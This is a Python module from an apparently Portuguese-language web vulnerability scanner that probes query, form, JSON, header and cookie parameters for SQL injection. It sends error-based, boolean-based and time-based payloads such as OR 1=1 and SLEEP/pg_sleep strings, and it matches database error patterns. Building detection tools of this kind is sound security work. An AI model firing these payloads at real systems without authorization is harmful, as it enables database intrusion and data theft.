import time
import re
from typing import List, Any, Dict

import requests

from src.core.request_rebuilder import rebuild_attack_request
from src.core.vulnerability import Vulnerability
from src.scanners.IScanModule import IScanModule, RequestNode, InjectionPoint

OASTClient = Any


class SqlInjectionModule(IScanModule):
    """Detecta SQLi (error-based + time-based) em pontos de injecao."""

    SQL_ERROR_PATTERNS = [
        r"(?i)sql\s+syntax",
        r"(?i)mysql_",
        r"(?i)you have an error in your sql",
        r"(?i)postgresql.*error",
        r"(?i)syntax error at or near",
        r"(?i)unterminated quoted string",
        r"(?i)pg_query",
        r"(?i)pg_exec",
        r"(?i)pg_",
        r"(?i)microsoft sql server",
        r"(?i)odbc driver",
        r"(?i)ora-\d{5}",
        r"(?i)sqlite.*error",
        r"(?i)sqlstate\[\w+\]",
    ]

    def run_test(
        self,
        request_node: RequestNode,
        injection_point: InjectionPoint,
        oast_client: OASTClient
    ) -> List[Vulnerability]:
        relevant_locations = {'QUERY', 'BODY_FORM', 'BODY_FORM_JSON', 'BODY_JSON', 'HEADER', 'COOKIE'}
        if injection_point['location'] not in relevant_locations:
            return []

        session = requests.Session()
        session.verify = False
        session.timeout = 5

        original_value = str(injection_point.get('original_value', ''))
        is_numeric = self._is_numeric(original_value)

        # Error-based payloads. Numeric payloads matter for legacy e-Cidade SQL
        # such as "campo = {$valor}" where quotes are not present in SQL.
        error_payloads = [
            "'",
            '"',
            "'-- ",
            "\")",
            "' OR '1'='1'-- ",
            '" OR "1"="1"-- ',
        ]
        if is_numeric:
            error_payloads = [
                f"{original_value}'",
                f"{original_value} OR 1=1-- ",
                f"{original_value}) OR 1=1-- ",
                f"{original_value} AND 1=CONVERT(int,'x')-- ",
            ] + error_payloads

        for payload in error_payloads:
            try:
                request_to_send = rebuild_attack_request(request_node, injection_point, payload)
                response = session.send(request_to_send, timeout=session.timeout)
                if self._has_sql_error(response.text):
                    snippet = self._extract_error_snippet(response.text)
                    return [
                        Vulnerability(
                            name="SQL Injection (Error-Based)",
                            severity="High",
                            description=(
                                "SQL Injection detectada por mensagens de erro no response. "
                                f"Payload '{payload}' em '{injection_point['parameter_name']}'."
                            ),
                            evidence=f"Payload: {payload} | Match: {snippet}",
                            request_node_id=request_node['id'],
                            injection_point_id=injection_point['id']
                        )
                    ]
            except requests.exceptions.RequestException:
                continue
            except Exception:
                return []

        boolean_payloads = self._boolean_payloads(original_value, is_numeric)
        boolean_vuln = self._check_boolean_based(session, request_node, injection_point, boolean_payloads)
        if boolean_vuln:
            return [boolean_vuln]

        # Time-based payloads
        time_payloads = [
            "' AND SLEEP(3)-- ",
            "' OR SLEEP(3)-- ",
            '" AND SLEEP(3)-- ',
            "' AND pg_sleep(3)-- ",
            "' AND BENCHMARK(3000000,MD5(1))-- ",
        ]
        if is_numeric:
            time_payloads = [
                f"{original_value} AND SLEEP(3)-- ",
                f"{original_value} OR SLEEP(3)-- ",
                f"{original_value} AND pg_sleep(3)-- ",
                f"{original_value} OR pg_sleep(3)-- ",
            ] + time_payloads

        for payload in time_payloads:
            try:
                start = time.time()
                request_to_send = rebuild_attack_request(request_node, injection_point, payload)
                session.send(request_to_send, timeout=session.timeout)
                elapsed = time.time() - start
                if elapsed >= 3:
                    return [
                        Vulnerability(
                            name="SQL Injection (Time-Based)",
                            severity="High",
                            description=(
                                "Possivel SQL Injection por atraso na resposta. "
                                f"Payload '{payload}' em '{injection_point['parameter_name']}'."
                            ),
                            evidence=f"Payload: {payload} | Delay: {elapsed:.2f}s",
                            request_node_id=request_node['id'],
                            injection_point_id=injection_point['id']
                        )
                    ]
            except requests.exceptions.RequestException:
                continue
            except Exception:
                return []

        return []

    def _boolean_payloads(self, original_value: str, is_numeric: bool):
        if is_numeric:
            return [
                (f"{original_value} AND 1=1", f"{original_value} AND 1=2"),
                (f"{original_value} OR 1=1", f"{original_value} AND 1=2"),
            ]
        return [
            ("' AND '1'='1'-- ", "' AND '1'='2'-- "),
            ('" AND "1"="1"-- ', '" AND "1"="2"-- '),
        ]

    def _check_boolean_based(self, session, request_node, injection_point, payload_pairs):
        try:
            base_request = rebuild_attack_request(request_node, injection_point, str(injection_point.get('original_value', '')))
            base_response = session.send(base_request, timeout=session.timeout)
            base_body = base_response.text or ""
        except requests.exceptions.RequestException:
            return None

        for true_payload, false_payload in payload_pairs:
            try:
                true_request = rebuild_attack_request(request_node, injection_point, true_payload)
                false_request = rebuild_attack_request(request_node, injection_point, false_payload)
                true_response = session.send(true_request, timeout=session.timeout)
                false_response = session.send(false_request, timeout=session.timeout)
            except requests.exceptions.RequestException:
                continue

            base_len = len(base_body)
            true_len = len(true_response.text or "")
            false_len = len(false_response.text or "")
            true_delta = abs(base_len - true_len)
            false_delta = abs(base_len - false_len)
            threshold = max(30, int(max(base_len, 1) * 0.08))

            true_like_base = true_response.status_code == base_response.status_code and true_delta <= threshold
            false_different = (
                false_response.status_code != base_response.status_code
                or false_delta > threshold
                or self._body_similarity(base_body, false_response.text or "") < 0.85
            )

            if true_like_base and false_different:
                return Vulnerability(
                    name="SQL Injection (Boolean-Based)",
                    severity="High",
                    description=(
                        "SQL Injection booleana detectada por diferenca entre respostas TRUE/FALSE. "
                        f"Payload TRUE '{true_payload}' e FALSE '{false_payload}' em "
                        f"'{injection_point['parameter_name']}'."
                    ),
                    evidence=(
                        f"Payload TRUE: {true_payload} | Payload FALSE: {false_payload} | "
                        f"Status base/true/false: {base_response.status_code}/"
                        f"{true_response.status_code}/{false_response.status_code} | "
                        f"Tamanho base/true/false: {base_len}/{true_len}/{false_len}"
                    ),
                    request_node_id=request_node['id'],
                    injection_point_id=injection_point['id']
                )
        return None

    def _body_similarity(self, left: str, right: str) -> float:
        if left == right:
            return 1.0
        if not left or not right:
            return 0.0
        left_set = set(left.split())
        right_set = set(right.split())
        if not left_set or not right_set:
            return 0.0
        return len(left_set & right_set) / len(left_set | right_set)

    def _is_numeric(self, value: str) -> bool:
        return bool(re.fullmatch(r"-?\d+(\.\d+)?", str(value).strip()))

    def _has_sql_error(self, body: str) -> bool:
        return any(re.search(pattern, body or "") for pattern in self.SQL_ERROR_PATTERNS)

    def _extract_error_snippet(self, body: str) -> str:
        text = body or ""
        for pattern in self.SQL_ERROR_PATTERNS:
            match = re.search(pattern, text)
            if match:
                start = max(match.start() - 80, 0)
                end = min(match.end() + 80, len(text))
                return text[start:end]
        return text[:200]
